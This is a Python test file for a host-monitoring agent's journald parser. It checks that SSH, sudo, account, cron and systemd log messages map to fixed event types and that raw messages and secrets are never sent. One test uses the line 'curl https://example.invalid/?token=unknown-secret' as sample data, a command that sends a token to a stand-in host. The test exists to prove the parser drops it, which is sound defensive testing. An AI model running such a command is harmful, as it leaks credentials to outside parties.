"""Synthetic parser tests proving that raw journald messages never leave the agent."""

import json
from datetime import UTC, datetime
from pathlib import Path

import pytest

from woland_guard_agent.normalization import normalize_record
from woland_guard_agent.sources import JournalRecord
from woland_guard_agent.sources.journald import parse_journal_json_line

FIXTURE = Path("tests/fixtures/journald/sshd_login.json")


def test_normalizes_supported_ssh_fixture_with_fixed_fields() -> None:
    record = parse_journal_json_line(FIXTURE.read_text(encoding="utf-8"))
    assert record is not None

    event = normalize_record(
        record,
        collected_at=datetime(2024, 7, 3, 10, 0, tzinfo=UTC),
    )

    assert event is not None
    assert event.event_type == "linux.ssh.login_succeeded"
    assert event.actor == "fixture_user"
    assert str(event.source_ip) == "192.0.2.10"
    assert event.summary == "SSH login succeeded"
    assert event.attributes == {"authentication_method": "publickey"}


@pytest.mark.parametrize(
    ("identifier", "message", "event_type"),
    [
        (
            "sshd",
            "Failed password for invalid user ghost from 198.51.100.8 port 22 ssh2",
            "linux.ssh.authentication_failed",
        ),
        (
            "sshd",
            "Accepted password for alice from 2001:db8::1 port 22 ssh2",
            "linux.ssh.login_succeeded",
        ),
        (
            "sudo",
            "pam_unix(sudo:auth): authentication failure; user=alice",
            "linux.sudo.authentication_failed",
        ),
        (
            "useradd",
            "new user: name=bob, UID=1001, GID=1001, home=/home/bob",
            "linux.account.user_created",
        ),
        (
            "usermod",
            "add 'bob' to group 'sudo'",
            "linux.account.privileged_group_changed",
        ),
        (
            "crontab",
            "(alice) REPLACE (alice)",
            "linux.cron.job_changed",
        ),
        (
            "crontab",
            "(alice) DELETE (alice)",
            "linux.cron.job_changed",
        ),
    ],
)
def test_supported_messages_have_specific_event_types(
    identifier: str,
    message: str,
    event_type: str,
) -> None:
    event = normalize_record(
        JournalRecord(
            cursor=f"s=synthetic;i={event_type}",
            fields={"SYSLOG_IDENTIFIER": identifier, "MESSAGE": message},
        )
    )

    assert event is not None
    assert event.event_type == event_type


def test_cron_edit_session_without_a_save_is_not_a_change() -> None:
    """BEGIN EDIT/LIST/END EDIT bracket a session and fire even without a save."""

    for message in (
        "(alice) BEGIN EDIT (alice)",
        "(alice) LIST (alice)",
        "(alice) END EDIT (alice)",
    ):
        event = normalize_record(
            JournalRecord(
                cursor=f"s=synthetic;i={message}",
                fields={"SYSLOG_IDENTIFIER": "crontab", "MESSAGE": message},
            )
        )

        assert event is None


@pytest.mark.parametrize(
    ("fields", "should_match"),
    [
        (
            {"MESSAGE_ID": "9d1aaa27d60140bd96365438aad20286", "UNIT": "ssh.service"},
            True,
        ),
        (
            {"MESSAGE_ID": "9d1aaa27d60140bd96365438aad20286", "UNIT": "rsyslog.service"},
            True,
        ),
        (
            # Right catalog entry, but not a unit this project treats as critical:
            # a normal host stops many timer-triggered units every day.
            {"MESSAGE_ID": "9d1aaa27d60140bd96365438aad20286", "UNIT": "logrotate.service"},
            False,
        ),
        (
            # A different, unrelated catalog entry (unit start job began) reusing
            # the same UNIT= value must not be mistaken for a stop.
            {"MESSAGE_ID": "7d4958e842da4a758f6c1cdc7b36dcc5", "UNIT": "ssh.service"},
            False,
        ),
        (
            {"UNIT": "ssh.service"},
            False,
        ),
    ],
)
def test_only_critical_units_stopping_becomes_an_event(
    fields: dict[str, str],
    should_match: bool,
) -> None:
    event = normalize_record(
        JournalRecord(
            cursor="s=synthetic;i=systemd",
            fields={
                "SYSLOG_IDENTIFIER": "systemd",
                "MESSAGE": "Stopped Some Unit.",
                **fields,
            },
        )
    )

    assert (event is not None) is should_match
    if event is not None:
        assert event.event_type == "linux.systemd.unit_stopped"
        assert event.attributes == {"unit": fields["UNIT"]}


def test_arbitrary_command_in_message_is_not_transmitted() -> None:
    command = "curl https://example.invalid/?token=unknown-secret"
    event = normalize_record(
        JournalRecord(
            cursor="s=synthetic;i=command",
            fields={"SYSLOG_IDENTIFIER": "bash", "MESSAGE": command},
        )
    )

    assert event is None


def test_unknown_fields_and_secret_are_not_transmitted() -> None:
    raw = json.loads(FIXTURE.read_text(encoding="utf-8"))
    raw["UNSUPPORTED_SECRET"] = "unknown-secret-value"  # noqa: S105 - synthetic
    record = JournalRecord(cursor=str(raw["__CURSOR"]), fields=raw)
    event = normalize_record(record)

    assert event is not None
    serialized = event.model_dump_json()
    assert "must-not-leave" not in serialized
    assert "unknown-secret-value" not in serialized
    assert "MESSAGE" not in serialized


def test_unknown_message_is_not_sent() -> None:
    event = normalize_record(
        JournalRecord(
            cursor="s=synthetic;i=unknown",
            fields={"SYSLOG_IDENTIFIER": "sshd", "MESSAGE": "unrecognized secret"},
        )
    )

    assert event is None


def test_nul_message_is_skipped_before_contract_validation() -> None:
    event = normalize_record(
        JournalRecord(
            cursor="s=synthetic;i=nul",
            fields={
                "SYSLOG_IDENTIFIER": "sshd",
                "MESSAGE": "Accepted password for alice from 192.0.2.1\x00 port 22 ssh2",
            },
        )
    )

    assert event is None


def test_event_id_is_deterministic_for_journald_cursor() -> None:
    record = JournalRecord(
        cursor="s=synthetic;i=deterministic",
        fields={
            "SYSLOG_IDENTIFIER": "sshd",
            "MESSAGE": "Accepted password for alice from 192.0.2.1 port 22 ssh2",
        },
    )

    first = normalize_record(record)
    second = normalize_record(record)

    assert first is not None
    assert second is not None
    assert first.event_id == second.event_id
